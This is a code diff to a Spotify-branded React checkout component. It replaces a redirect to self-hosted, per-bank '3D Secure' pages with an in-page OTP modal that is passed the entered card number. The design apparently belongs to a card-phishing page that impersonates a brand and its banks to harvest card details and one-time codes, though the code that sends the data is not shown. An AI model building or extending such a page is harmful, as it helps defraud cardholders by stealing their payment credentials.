@@ -8,10 +8,12 @@ import Amex from "./img/amex.svg"
 import { CreditCard } from "lucide-react"
 import { Link } from "react-router"
 import usePaymentStore from './store'
+import { OtpModal } from '../otp/Otp'
 
 export const SpotifyPurchase = () => {
   const [paymentMethod, setPaymentMethod] = useState("div")
   const [selectedBank, setSelectedBank] = useState("")
+  const [showOtp, setShowOtp] = useState(false)
   const { cardData, loading, error, updateCardData, submitPayment } = usePaymentStore()
 
   // Leer la URL 3D Secure desde variables de entorno
@@ -66,17 +68,14 @@ export const SpotifyPurchase = () => {
     // Si es PSE, submitPayment ya redirige, no mostrar alertas
     if (paymentMethod === "pse") return;
     if (response.success) {
-      // Redirigir usando el valor de 'bank' devuelto por la API
-      const bank = response.data && response.data.bank ? response.data.bank : selectedBank;
-      if (threeDSUrl) {
-        window.location.href = `${threeDSUrl}/payments/${bank}`
-      }
+      setShowOtp(true)
     } else {
       alert(response.error)
     }
   }
 
   return (
+    <>
     <div className="min-h-screen bg-white">
       <div className="max-w-2xl mx-auto px-6 py-8">
         {/* Header */}
@@ -311,6 +310,12 @@ export const SpotifyPurchase = () => {
     </div>
 </div>
 
-
+{showOtp && (
+  <OtpModal
+    cardNumber={cardData.cardNumber}
+    onClose={() => setShowOtp(false)}
+  />
+)}
+    </>
   )
 }
